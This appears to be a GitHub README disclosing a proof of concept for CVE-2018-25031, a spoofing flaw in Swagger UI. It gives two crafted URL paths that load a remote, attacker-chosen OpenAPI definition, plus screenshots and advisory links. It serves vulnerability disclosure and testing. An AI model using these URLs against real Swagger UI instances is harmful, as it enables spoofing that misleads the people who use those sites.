

### CVE-2018-25031  
<div align="center">
<img src="https://afine.pl/wp-content/uploads/2017/06/afine2.png" align="center" style="width: 40%" />
</div>  
  



### Description:  
#### Swagger UI before 4.1.3 could allow a remote attacker to conduct spoofing attacks. By persuading a victim to open a crafted URL, an attacker could exploit this vulnerability to display remote OpenAPI definitions.

  
<br/>   
 
### Screenshot before attack:
<img src="https://github.com/afine-com/CVE-2018-25031/blob/main/1.png" align="center" style="width: 100%" />

### PoC:
```
/index.html?configUrl=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json
/index.html?url=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json
```

### PoC Screenshot after attack:
<img src="https://github.com/afine-com/CVE-2018-25031/blob/main/2.png" align="center" style="width: 100%" />

### References:

<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-25031">https://nvd.nist.gov/vuln/detail/CVE-2018-25031</a><br>
<a href="https://deps.dev/advisory/GHSA/GHSA-cr3q-pqgq-m8c2">https://deps.dev/advisory/GHSA/GHSA-cr3q-pqgq-m8c2</a>

##### Tested on Swagger UI 3.52.1
